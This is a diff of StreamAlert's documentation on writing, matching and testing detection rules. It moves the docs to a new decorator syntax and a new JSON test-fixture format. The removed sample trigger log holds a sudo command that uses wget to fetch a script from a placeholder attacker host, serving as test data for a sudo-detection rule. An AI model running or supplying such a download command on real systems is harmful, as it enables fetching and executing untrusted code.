@@ -27,7 +27,7 @@ Example::
       production
   )
 
-.. note:: If you skip the step above, your rules will not be used by StreamAlert.
+.. note:: If you skip the step above, your rules will not be load into StreamAlert.
 
 Overview
 --------
@@ -36,15 +36,15 @@ Each Rule file must contain the following at the top::
 
   from stream_alert import rule_helpers
   from stream_alert.rules_engine import StreamRules
+
   rule = StreamRules.rule
 
 All rules take this structure::
 
-    @rule('example',
-          logs=[...],
+    @rule(logs=[...],
           matchers=[...],
           outputs=[...])
-    def example(record):
+    def example(record):          # the rule name will be 'example'
         # code                    # analyze the incoming record w/ your logic
         return True               # return True if an alert should be sent
 
@@ -57,13 +57,13 @@ Here’s an example that alerts on the use of sudo in a PCI environment::
 
     from fnmatch import fnmatch
 
-    @rule('production_sudo',                          # name of the rule
-          logs=['osquery'],                           # applicable datasource(s)
+    @rule(logs=['osquery'],                           # applicable datasource(s)
           matchers=['pci'],                           # matcher(s) to evaluate
           outputs=['s3', 'pagerduty', 'slack'])       # where to send alerts
     def production_sudo(record):                      # incoming record/log
         table_name = record['name']
         tag = record['columns']['tag']
+
         return (
           table_name == 'linux_syslog_auth' and
           fnmatch(tag, 'sudo*')
@@ -96,8 +96,8 @@ Matchers are defined in ``rules/matchers.py``. If desired, matchers can also be 
 
 In the above example, we are evaluating the ``pci`` matcher.  As you can likely deduce, this ensures alerts are only triggered if the incoming record is from the ``pci`` environment. This is achieved by looking for a particular field in the log. The code::
 
-    @matcher('pci')
-    def is_prod_env(record):
+    @matcher()
+    def pci(record):
         return record['decorations']['envIdentifier'] == 'pci'
 
 
@@ -117,14 +117,12 @@ This feature should be avoided, but it is useful if you defined a loose schema t
 
 Examples::
 
-  @rule('osquery_etc_hosts',
-        logs=['osquery'],
+  @rule(logs=['osquery'],
         outputs=['pagerduty', 's3'],
         req_subkeys={'columns':['address', 'hostnames']})
         ...
 
-  @rule('osquery_listening_ports',
-        logs=['osquery'],
+  @rule(logs=['osquery'],
         outputs=['pagerduty', 's3'],
         req_subkeys={'columns':['port', 'protocol']})
         ...
@@ -132,7 +130,7 @@ Examples::
 
 Helpers
 -------
-To improve readability and writability of rules, you can extract commonly used ``Python`` processing logic into custom helper methods.   These helpers are defined in ``stream_alert/rule_helpers.py`` and can be called from within a matcher or rule.
+To improve readability and writability of rules, you can extract commonly used ``Python`` processing logic into custom helper methods.   These helpers are defined in ``rules/helpers/base.py`` and can be called from within a matcher or rule.
 
 Example function::
 
@@ -150,7 +148,7 @@ Example function::
 
 Example use of that function within a rule::
 
-    @rule('foobar', ...)
+    @rule(...)
     def foobar(record):
         user = 'joe'
         user_whitelist = { 'mike', 'jin', 'jack', 'mary' }
@@ -161,53 +159,67 @@ Example use of that function within a rule::
 Rules Testing
 -------------
 
-In order to test the effectiveness of our new rules, you can run a set of local integration tests to verify alerts would be triggered.  The `stream_alert_cli.py` command line tool comes built-in with a `lambda test` command.
+In order to test the effectiveness of new rules, local integration tests can be ran to verify that alerts would be triggered given a certain input.  The `stream_alert_cli.py` command line tool comes built-in with a `lambda test` command which does exactly this.
 
 Configuration
 ~~~~~~~~~~~~~
 
-To get started, create (or find) an example log for your given rule.  If the rule you added expects incoming records to be JSON, add a raw JSON record into the ``trigger_events.json`` file for the related stream.
-
-Example logs will be stored in the ``test/integration/fixtures/kinesis`` subdirectory.  A new folder should be created for each Kinesis stream as declared in your `sources.json <conf-datasources.html>`_.
-
-Within each of these folders, add the following two files:
-
-* ``trigger_events.json``
-* ``non_trigger_events.json``
-
-These files allow you to separate true positives from false positives.
-
-Recall our earlier example that alerts on the use of ``sudo`` in the ``pci`` environment. In ``trigger_events.json``, you would add an example log that should alert::
-
+To test a new rule, first create a new file under `test/integration/rules` named `rule_name_goes_here.json`.  This file should contain this exact structure::
+  
   {
-    "name": "linux_syslog_auth",
-    "hostIdentifier": "foobar",
-    "unixTime": "1470824034",
-    "decorations": {
-      "envIdentifier": "pci",
-      "roleIdentifier": "memcache"
-    },
-    "columns": {
-      "tag": "sudo",
-      "message": "john_adams : TTY=pts/0 ; PWD=/home/john_adams ; USER=root ; COMMAND=/usr/bin/wget http://evil.tld/x.sh",
-      "facility": "authpriv"
-    },
-    "action": "added"
+    "records": [
+      {
+        "data": {} or "",
+        "description": "of the test",
+        "trigger": true or false,
+        "source": "kinesis_stream_name" or "s3_bucket_id",
+        "service": "kinesis" or "s3"
+      }
+    ]
   }
 
-.. warning:: One event per line. This log was put on multiple lines for readability and education purposes.
+The `data` key can either be a Map or a String.  Normally all json types should be in Map format while others should be String (csv, kv, syslog).
 
-And lastly, in ``non_trigger_events.json``, you would add an example that shouldn't fire.
+The `description` key should be a short sentence describing the intent of the test.
 
-Running Tests
-~~~~~~~~~~~~~
+The `trigger` key indicates whether or not this record should produce an alert or not.  This is used to determine that all of our test records produce the correct amount of alerts.
 
-To test an example record coming from Kinesis::
+The `source` key is the name of the kinesis stream or s3 bucket.
+
+The `service` key is the name of the AWS service which sent the alert (kinesis or s3).
+
+For more examples, see the default rule tests in `test/integration/rules`.
+
+Running Tests - Kinesis
+~~~~~~~~~~~~~~~~~~~~~~~
+
+To run integration tests::
 
   ./stream_alert_cli.py lambda test --func alert --source kinesis
 
-To test example records from S3::
+This will produce the following output::
 
-  ./stream_alert_cli.py lambda test --func alert --source s3
+invalid_subnet
+	test: user logging in from an untrusted subnet       [Pass]
+	test: user logging in from the trusted subnet        [Pass]
+
+invalid_user
+	test: user not in the whitelist                      [Pass]
+	test: user in the whitelist                          [Pass]
+
+sample_csv_rule
+	test: host is test-host-2                            [Pass]
+
+sample_json_rule
+	test: host is test-host-1                            [Pass]
+
+sample_kv_rule
+	test: fatal message from uid 100                     [Pass]
+
+sample_syslog_rule
+	test: sudo command ran                               [Pass]
+
+  Running Tests - S3
+  ~~~~~~~~~~~~~~~~~~
 
 .. note:: coming soon - Amazon S3 testing instructions
